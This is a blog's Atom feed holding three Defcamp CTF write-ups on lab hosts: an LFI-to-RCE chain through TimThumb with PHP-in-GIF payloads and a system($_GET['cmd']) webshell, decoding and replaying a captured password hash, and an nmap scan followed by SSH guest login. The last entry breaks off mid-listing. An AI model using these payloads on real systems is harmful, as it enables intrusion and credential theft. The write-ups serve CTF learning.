<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-11-01T15:21:30+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Defcamp CTF: Web 300]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-web-300/"/>
    <updated>2014-11-01T15:11:55+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-web-300</id>
    <content type="html"><![CDATA[<p>We are again given an ip address. Upon visiting, it turns out to be some rudimentary page. I immediately spotted a LFI vulnerability, surfing to <code>http://10.13.37.13/?page=../../../../../../etc/passwd</code>.</p>

<!--more-->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash 
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin 
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin 
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync 
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin 
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid: 
</span><span class='line'>sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin 
</span><span class='line'>syslog:x:102:105::/home/syslog:/bin/false 
</span><span class='line'>ubuntu:x:1000:1000::/home/ubuntu:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Cool, but I couldn&rsquo;t get further with this. The images are apparently served by TimThumb, as I got this trying to do a LFI in <code>http://10.13.37.13/tt.php?w=240&amp;src=../../../../../etc/passwd</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file not found
</span><span class='line'>Query String : w=240&src=../../../../../etc/passwd
</span><span class='line'>TimThumb version : 1.33</span></code></pre></td></tr></table></div></figure>


<p><a href="http://markmaunder.com/2011/08/02/technical-details-and-scripts-of-the-wordpress-timthumb-php-hack/">TimThumb v1.33</a> is vulnerable to RCE. The trick is to upload a malicious JPEG or GIF. This image contains php code, which is also uploaded into the thumbnail. This thumbnail is then stored into the <code>cache</code> directory. Indeed, externally uploaded images files are uploaded there, but only from domains that are in the whitelist. Luckily, <code>photobucket</code> is one of them. I made a black GIF image with a little bit of php appended:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;Hi&quot;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>After uploading it to photobucket, I browsed to <code>http://10.13.37.13/tt.php?w=2400&amp;src=http://i36.photobucket.com/albums/e31/sbsebastian1/pwn_zpsa043d8a3.gif</code>. If you then take the md5 of the request, you can figure out where this image file is saved:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -ne <span class="s1">&#39;http://i36.photobucket.com/albums/e31/sbsebastian1/pwn_zpsa043d8a3.gif&#39;</span> <span class="p">|</span>md5sum
</span><span class='line'>995e80b11b06e24b7d96ce109f4ef217  -
</span></code></pre></td></tr></table></div></figure>


<p>This particular file was stored at <code>./cache/external_995e80b11b06e24b7d96ce109f4ef217</code> so I hit the first LFI with that image: <code>http://10.13.37.13/?page=./cache/external_995e80b11b06e24b7d96ce109f4ef217</code>. Besides a lot of garbage, I also got &lsquo;Hi&rsquo;. No php tags, just &lsquo;Hi&rsquo;. This meant that it was indeed executing php code! I attempted to upload a reverse php shell and a simple <code>system($_GET['cmd']);</code> webshell, but both failed. I suspect <code>system()</code> is being blocked or filtered. Frustrated, I uploaded a GIF with the following php code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">...</span><span class="nx">gifdata</span><span class="o">...</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;HI FROM VULNHUB-CTF&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="sb">`ls -alh`</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This gave me a directory listing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">HI</span> <span class="nx">FROM</span> <span class="nx">VULNHUB</span><span class="o">-</span><span class="nx">CTFtotal</span> <span class="mi">116</span><span class="nx">K</span>
</span><span class='line'>
</span><span class='line'><span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">6</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mf">4.0</span><span class="nx">K</span> <span class="nx">Oct</span> <span class="mi">12</span> <span class="mi">12</span><span class="o">:</span><span class="mi">36</span> <span class="o">.</span>
</span><span class='line'><span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">3</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mf">4.0</span><span class="nx">K</span> <span class="nx">Oct</span> <span class="mi">12</span> <span class="mi">12</span><span class="o">:</span><span class="mi">35</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">12</span> <span class="nx">Oct</span> <span class="mi">12</span> <span class="mi">12</span><span class="o">:</span><span class="mi">09</span> <span class="mi">575</span><span class="nx">b3f3f5318b2afbfe91ed860a4b10c</span><span class="o">.</span><span class="nx">txt</span>
</span><span class='line'><span class="nx">drwxrwxrwx</span> <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">52</span><span class="nx">K</span> <span class="nx">Oct</span> <span class="mi">18</span> <span class="mi">15</span><span class="o">:</span><span class="mi">14</span> <span class="nx">cache</span>
</span><span class='line'><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mf">2.7</span><span class="nx">K</span> <span class="nx">Oct</span> <span class="mi">12</span> <span class="mi">12</span><span class="o">:</span><span class="mi">08</span> <span class="nx">contact</span><span class="o">.</span><span class="nx">html</span>
</span><span class='line'><span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mf">4.0</span><span class="nx">K</span> <span class="nx">Aug</span> <span class="mi">29</span> <span class="mi">12</span><span class="o">:</span><span class="mi">19</span> <span class="nx">css</span>
</span><span class='line'><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mf">2.9</span><span class="nx">K</span> <span class="nx">Oct</span> <span class="mi">12</span> <span class="mi">12</span><span class="o">:</span><span class="mo">04</span> <span class="nx">home</span><span class="o">.</span><span class="nx">html</span>
</span><span class='line'><span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mf">4.0</span><span class="nx">K</span> <span class="nx">Aug</span> <span class="mi">29</span> <span class="mi">12</span><span class="o">:</span><span class="mi">19</span> <span class="nx">images</span>
</span><span class='line'><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">180</span> <span class="nx">Oct</span> <span class="mi">12</span> <span class="mi">12</span><span class="o">:</span><span class="mo">03</span> <span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mf">4.0</span><span class="nx">K</span> <span class="nx">Aug</span> <span class="mi">29</span> <span class="mi">12</span><span class="o">:</span><span class="mi">19</span> <span class="nx">js</span>
</span><span class='line'><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">21</span><span class="nx">K</span> <span class="nx">Jul</span> <span class="mi">31</span> <span class="mi">2011</span> <span class="nx">tt</span><span class="o">.</span><span class="nx">php</span>
</span></code></pre></td></tr></table></div></figure>


<p>This file called <code>575b3f3f5318b2afbfe91ed860a4b10c.txt</code> looked suspicious, so I uploaded a new GIF/php hybrid.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">...</span><span class="nx">gifdata</span><span class="o">...</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;HI FROM VULNHUB-CTF&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="sb">`cat 575b3f3f5318b2afbfe91ed860a4b10c.txt`</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>After hitting the LFI again, I was presented with the flag: <code>johnnybravo</code>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcamp CTF: Network 200]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-network-200/"/>
    <updated>2014-11-01T15:08:59+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-network-200</id>
    <content type="html"><![CDATA[<p>This writeup is about Defcamp CTF&rsquo;s Network 200. Again, we get a clue!</p>

<p><code>That ****ing manager got smarter. He moved to house number 22, but we got this: ****managers.pcap</code></p>

<!--more-->


<p>Profanity aside, house number 22 probably means that the ip address of this challenge is <code>10.13.37.21</code>. The pcap file contains network traffic of the manager logging in to the page at 10.13.37.21. Upon examination of this page, it seems it generates a nonce. This nonce is to encode the md5 of the password, which it then sent over as GET parameters.</p>

<p>Looking at the pcap file, Swappage quickly identified this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user=manager&nonce=7413734ab666ce02cf27c9862c96a8e7&pass=3ecd6317a873b18e7dde351ac094ee3b</span></code></pre></td></tr></table></div></figure>


<p>So we need to reverse this nonce-based encryption to get the md5&#8217;ed password of manager. The source of the login page reveals that the nonce is valid for about 100 seconds and the function that is used to generate the encoded password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.hook-submit&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">h1</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#pass&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">());</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">h2</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#nonce&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">xor</span> <span class="o">=</span> <span class="nx">myxor</span><span class="p">(</span><span class="nx">h1</span><span class="p">,</span> <span class="nx">h2</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#hiddenpass&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="nx">xor</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#form&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span> <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>This threw me off. I thought the nonce and md5 were <code>XOR</code>ed together. I couldn&rsquo;t be further from the truth. After wasting some time, I investigated the javascript:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">...</span><span class="nx">snip</span><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">hex2n</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nx">c</span><span class="p">))</span> <span class="k">return</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">-</span> <span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">n2hex</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nx">n</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s1">&#39;&#39;</span> <span class="o">+</span> <span class="nx">n</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">n</span> <span class="o">-</span> <span class="mi">10</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">myxor</span><span class="p">(</span><span class="nx">h1</span><span class="p">,</span> <span class="nx">h2</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">xored</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">h1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">c1</span> <span class="o">=</span> <span class="nx">h1</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">c2</span> <span class="o">=</span> <span class="nx">h2</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">alert</span><span class="p">(</span><span class="nx">hex2n</span><span class="p">(</span><span class="nx">c1</span><span class="p">));</span> <span class="c1">// DEBUG by barrebas</span>
</span><span class='line'>      <span class="nx">alert</span><span class="p">(</span><span class="nx">hex2n</span><span class="p">(</span><span class="nx">c2</span><span class="p">));</span> <span class="c1">// DEBUG by barrebas</span>
</span><span class='line'>      <span class="nx">alert</span><span class="p">(</span><span class="nx">n2hex</span><span class="p">((</span><span class="nx">hex2n</span><span class="p">(</span><span class="nx">c1</span><span class="p">)</span> <span class="o">+</span> <span class="nx">hex2n</span><span class="p">(</span><span class="nx">c2</span><span class="p">))</span> <span class="o">%</span> <span class="mi">16</span><span class="p">));</span> <span class="c1">// DEBUG by barrebas</span>
</span><span class='line'>      <span class="nx">xored</span> <span class="o">+=</span> <span class="nx">n2hex</span><span class="p">((</span><span class="nx">hex2n</span><span class="p">(</span><span class="nx">c1</span><span class="p">)</span> <span class="o">+</span> <span class="nx">hex2n</span><span class="p">(</span><span class="nx">c2</span><span class="p">))</span> <span class="o">%</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">xored</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>With a few carefully placed <code>alert()</code>s, I was able to figure out that the <code>myxor</code> function takes each hex character of the nonce and the md5. These values are converted to integers and then added together. After a modulus 16 the hex-representation of the result is added to the output.</p>

<p>I wrote a small piece of python to do the reverse operation for me, given the nonce and the encoded md5:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="n">nonce</span> <span class="o">=</span> <span class="s">&#39;efa6085790a0294851202602a4833ad1&#39;</span>
</span><span class='line'><span class="n">epass</span> <span class="o">=</span> <span class="s">&#39;3ecd6317a873b18e7dde351ac094ee3b&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">makeHex</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">hex</span><span class="p">(</span><span class="n">c</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">getHex</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">((</span><span class="s">&#39;0&#39;</span><span class="p">,</span><span class="n">c</span><span class="p">)),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">epass</span><span class="p">)):</span>
</span><span class='line'>  <span class="n">output</span> <span class="o">+=</span> <span class="n">makeHex</span><span class="p">((</span><span class="n">getHex</span><span class="p">(</span><span class="n">epass</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="n">getHex</span><span class="p">(</span><span class="n">nonce</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">print</span> <span class="n">output</span>
</span></code></pre></td></tr></table></div></figure>


<p>This returned the md5 of the managers&#8217; password: <code>cabaf0ddf21df38cbeb77c94a40e4654</code>. Unfortunately, the Mighty Google did not return any hits when searching for it. Who needs it anyway? We have the md5 of the password, all we need to do is to re-encode it with a new nonce and submit it! I refreshed the login page, grabbed the nonce and ran the following piece of python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="n">nonce</span> <span class="o">=</span> <span class="s">&#39;efa6085790a0294851202602a4833ad1&#39;</span>
</span><span class='line'><span class="n">epass</span> <span class="o">=</span> <span class="s">&#39;3ecd6317a873b18e7dde351ac094ee3b&#39;</span>
</span><span class='line'><span class="n">passval</span> <span class="o">=</span> <span class="s">&#39;cabaf0ddf21df38cbeb77c94a40e4654&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">makeHex</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">hex</span><span class="p">(</span><span class="n">c</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">getHex</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">((</span><span class="s">&#39;0&#39;</span><span class="p">,</span><span class="n">c</span><span class="p">)),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">epass</span><span class="p">)):</span>
</span><span class='line'>  <span class="n">output</span> <span class="o">+=</span> <span class="n">makeHex</span><span class="p">((</span><span class="n">getHex</span><span class="p">(</span><span class="n">passval</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="n">getHex</span><span class="p">(</span><span class="n">nonce</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">print</span> <span class="n">output</span>
</span></code></pre></td></tr></table></div></figure>


<p>This returned a new, encoded md5 of the password. I copied it and entered <code>manager:idontcare</code> in the login form. I intercepted this request with TamperData, substituting the new, encoded md5 value for the old one and hit submit. Lo and behold:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">The</span> <span class="n">secret</span> <span class="ow">is</span> <span class="n">behind</span> <span class="n">bb00403ebcbfa0748bcbee426acfdb5b</span> <span class="p">:)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which is the md5 of <code>youtoo</code>, which thankfully was the proper flag!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcamp CTF: Network 100]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-network-100/"/>
    <updated>2014-11-01T15:08:24+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-network-100</id>
    <content type="html"><![CDATA[<p>For this challenge, we&rsquo;re given the following clue:</p>

<p><code>My manager lives at 10.13.37.21. Any guest is always welcome. But he has a secret. Can you find it out?</code></p>

<p>A secret? Let&rsquo;s dig in!</p>

<!--more-->


<p>I did a simple nmap scan of that box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-18 13:08 CEST
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.13.37.21
</span><span class='line'>Host is up <span class="o">(</span>0.024s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">998</span> closed ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>80/tcp open  http
</span></code></pre></td></tr></table></div></figure>


<p>The webpage has a login form, but I didn&rsquo;t have any credentials. The clue did say guests are always welcome, but <code>guest:guest</code> didn&rsquo;t work. However, these credentials <em>did</em> work for <code>ssh</code>! So I landed a shell on the box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
